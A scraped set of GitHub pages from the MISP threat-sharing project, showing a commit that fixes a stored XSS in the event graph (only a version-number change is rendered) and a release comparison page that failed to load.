This website uses cookies to improve your experience while you navigate through the website. Out of these, the cookies that are categorized as necessary are stored on your browser as they are essential for the working of basic functionalities of the website. We also use third-party cookies that help us analyze and understand how you use this website. These cookies will be stored in your browser only with your consent. You also have the option to opt-out of these cookies. But opting out of some of these cookies may affect your browsing experience.

Necessary

Necessary

Always Enabled

Necessary cookies are absolutely essential for the website to function properly. These cookies ensure basic functionalities and security features of the website, anonymously.

| Cookie | Duration | Description |
| --- | --- | --- |
| cookielawinfo-checkbox-analytics | 11 months | This cookie is set by GDPR Cookie Consent plugin. The cookie is used to store the user consent for the cookies in the category "Analytics". |
| cookielawinfo-checkbox-functional | 11 months | The cookie is set by GDPR cookie consent to record the user consent for the cookies in the category "Functional". |
| cookielawinfo-checkbox-necessary | 11 months | This cookie is set by GDPR Cookie Consent plugin. The cookies is used to store the user consent for the cookies in the category "Necessary". |
| cookielawinfo-checkbox-others | 11 months | This cookie is set by GDPR Cookie Consent plugin. The cookie is used to store the user consent for the cookies in the category "Other. |
| cookielawinfo-checkbox-performance | 11 months | This cookie is set by GDPR Cookie Consent plugin. The cookie is used to store the user consent for the cookies in the category "Performance". |
| viewed\_cookie\_policy | 11 months | The cookie is set by the GDPR Cookie Consent plugin and is used to store whether or not user has consented to the use of cookies. It does not store any personal data. |

Functional

Functional

Functional cookies help to perform certain functionalities like sharing the content of the website on social media platforms, collect feedbacks, and other third-party features.

Performance

Performance

Performance cookies are used to understand and analyze the key performance indexes of the website which helps in delivering a better user experience for the visitors.

Analytics

Analytics

Analytical cookies are used to understand how visitors interact with the website. These cookies help provide information on metrics the number of visitors, bounce rate, traffic source, etc.

Advertisement

Advertisement

Advertisement cookies are used to provide visitors with relevant ads and marketing campaigns. These cookies track visitors across websites and collect information to provide customized ads.

Others

Others

Other uncategorized cookies are those that are being analyzed and have not been classified into a category as yet.

SAVE & ACCEPT



=== Content from github.com_51474678_20250114_193248.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2FMISP%2FMISP%2Fcommit%2Fbb3b7a7e91862742cae228c43b3091bad476dcc0)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2FMISP%2FMISP%2Fcommit%2Fbb3b7a7e91862742cae228c43b3091bad476dcc0)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fvoltron%2Fcommit_fragments%2Frepo_layout&source=header-repo&source_repo=MISP%2FMISP)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[MISP](/MISP)
/
**[MISP](/MISP/MISP)**
Public

* [Notifications](/login?return_to=%2FMISP%2FMISP) You must be signed in to change notification settings
* [Fork
  1.4k](/login?return_to=%2FMISP%2FMISP)
* [Star
   5.5k](/login?return_to=%2FMISP%2FMISP)

* [Code](/MISP/MISP)
* [Issues
  2.5k](/MISP/MISP/issues)
* [Pull requests
  89](/MISP/MISP/pulls)
* [Discussions](/MISP/MISP/discussions)
* [Actions](/MISP/MISP/actions)
* [Projects
  1](/MISP/MISP/projects)
* [Wiki](/MISP/MISP/wiki)
* [Security](/MISP/MISP/security)
* [Insights](/MISP/MISP/pulse)

Additional navigation options

* [Code](/MISP/MISP)
* [Issues](/MISP/MISP/issues)
* [Pull requests](/MISP/MISP/pulls)
* [Discussions](/MISP/MISP/discussions)
* [Actions](/MISP/MISP/actions)
* [Projects](/MISP/MISP/projects)
* [Wiki](/MISP/MISP/wiki)
* [Security](/MISP/MISP/security)
* [Insights](/MISP/MISP/pulse)

## Commit

[Permalink](/MISP/MISP/commit/bb3b7a7e91862742cae228c43b3091bad476dcc0)

This commit does not belong to any branch on this repository, and may belong to a fork outside of the repository.

fix: [security] stored XSS fixed in event graph

[Browse files](/MISP/MISP/tree/bb3b7a7e91862742cae228c43b3091bad476dcc0)
Browse the repository at this point in the history

```
- unsanitised javascript insertion of tag name in the filters

- as reported by Dawid Czarnecki of Zigrin Security on behalf of the Luxembourg Army
```

* Loading branch information

[![@iglocska](https://avatars.githubusercontent.com/u/3668672?s=40&v=4)](/iglocska)

[iglocska](/MISP/MISP/commits?author=iglocska "View all commits by iglocska")
committed
Apr 17, 2022

1 parent
[107e271](/MISP/MISP/commit/107e271d78c255d658ce998285fe6f6c4f291b41)

commit bb3b7a7

 Show file tree

 Hide file tree

Showing
**2 changed files**
with
**370 additions**
and
**370 deletions**.

* Whitespace
* Ignore whitespace

* Split
* Unified

* app

  + Controller

    - app/Controller/AppController.php
      [AppController.php](#diff-c3e581465aa9c8cee8354aa5f99a5f47f5dd44e54729a4fe5b41b1cede0469be)
  + webroot/js

    - app/webroot/js/action\_table.js
      [action\_table.js](#diff-930f1ffc5c4a94ba7f0444dd45e8e887d99bcd48b49acbcde2a763079508c617)

## There are no files selected for viewing

2 changes: 1 addition & 1 deletion

2
[app/Controller/AppController.php](#diff-c3e581465aa9c8cee8354aa5f99a5f47f5dd44e54729a4fe5b41b1cede0469be "app/Controller/AppController.php")

Show comments

[View file](/MISP/MISP/blob/bb3b7a7e91862742cae228c43b3091bad476dcc0/app/Controller/AppController.php)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -34,7 +34,7 @@ class AppController extends Controller |
|  |  |  |
|  |  | public $helpers = array('OrgImg', 'FontAwesome', 'UserName'); |
|  |  |  |
|  |  | private $\_\_queryVersion = '138'; |
|  |  | private $\_\_queryVersion = '139'; |
|  |  | public $pyMispVersion = '2.4.157'; |
|  |  | public $phpmin = '7.2'; |
|  |  | public $phprec = '7.4'; |
| Expand Down | |  |

 Loading

Oops, something went wrong.
 Retry

Toggle all file notes
Toggle all file annotations

### 0 comments on commit `bb3b7a7`

Please
[sign in](/login?return_to=https%3A%2F%2Fgithub.com%2FMISP%2FMISP%2Fcommit%2Fbb3b7a7e91862742cae228c43b3091bad476dcc0) to comment.

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from github.com_b156e610_20250114_193249.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2FMISP%2FMISP%2Fcompare%2Fv2.4.157...v2.4.158)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2FMISP%2FMISP%2Fcompare%2Fv2.4.157...v2.4.158)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fcompare%2Fshow&source=header-repo&source_repo=MISP%2FMISP)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[MISP](/MISP)
/
**[MISP](/MISP/MISP)**
Public

* [Notifications](/login?return_to=%2FMISP%2FMISP) You must be signed in to change notification settings
* [Fork
  1.4k](/login?return_to=%2FMISP%2FMISP)
* [Star
   5.5k](/login?return_to=%2FMISP%2FMISP)

* [Code](/MISP/MISP)
* [Issues
  2.5k](/MISP/MISP/issues)
* [Pull requests
  89](/MISP/MISP/pulls)
* [Discussions](/MISP/MISP/discussions)
* [Actions](/MISP/MISP/actions)
* [Projects
  1](/MISP/MISP/projects)
* [Wiki](/MISP/MISP/wiki)
* [Security](/MISP/MISP/security)
* [Insights](/MISP/MISP/pulse)

Additional navigation options

* [Code](/MISP/MISP)
* [Issues](/MISP/MISP/issues)
* [Pull requests](/MISP/MISP/pulls)
* [Discussions](/MISP/MISP/discussions)
* [Actions](/MISP/MISP/actions)
* [Projects](/MISP/MISP/projects)
* [Wiki](/MISP/MISP/wiki)
* [Security](/MISP/MISP/security)
* [Insights](/MISP/MISP/pulse)

[Permalink](https://github.com/MISP/MISP/compare/MISP%3Af4e390a...MISP%3A9f1a239)
# Comparing changes

 Choose two branches to see what’s changed or to start a new pull request.
If you need to, you can also  compare across forks
 or
[learn more about diff comparisons](https://docs.github.com/pull-requests/collaborating-with-pull-requests/proposing-changes-to-your-work-with-pull-requests/about-comparing-branches-in-pull-requests#three-dot-and-two-dot-git-diff-comparisons).

# Open a pull request

 Create a new pull request by comparing changes across two branches. If you need to, you can also  compare across forks
.
[Learn more about diff comparisons here](https://docs.github.com/pull-requests/collaborating-with-pull-requests/proposing-changes-to-your-work-with-pull-requests/about-comparing-branches-in-pull-requests#three-dot-and-two-dot-git-diff-comparisons).

*base repository:*
MISP/MISP

Failed to load repositories. Confirm that selected base ref is valid, then try again.

 Loading

*base:*
v2.4.157

Choose a base ref

Branches
Tags

Could not load branches

Nothing to show

 Loading

[{{ refName }}
default](/MISP/MISP/compare/%7B%7B%20urlEncodedRefName%20%7D%7D...v2.4.158)

Could not load tags

Nothing to show

[{{ refName }}
default](/MISP/MISP/compare/%7B%7B%20urlEncodedRefName%20%7D%7D...v2.4.158)

 Loading

...

*head repository:*
MISP/MISP

Failed to load repositories. Confirm that selected head ref is valid, then try again.

 Loading

*compare:*
v2.4.158

Choose a head ref

Branches
Tags

Could not load branches

Nothing to show

 Loading

[{{ refName }}
default](/MISP/MISP/compare/v2.4.157...%7B%7B%20urlEncodedRefName%20%7D%7D)

Could not load tags

Nothing to show

[{{ refName }}
default](/MISP/MISP/compare/v2.4.157...%7B%7B%20urlEncodedRefName%20%7D%7D)

 Loading

10
contributors

[Commits
171](#commits_bucket)
[Files changed
135](#files_bucket)

 Loading

 Loading

### This comparison is taking too long to generate.

Unfortunately it looks like we can’t render this comparison for you right now. It might be too big, or there might be something weird with your repository.

You can try running this command locally to see the comparison on your machine:

`git diff v2.4.157...v2.4.158`

  Retry

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.


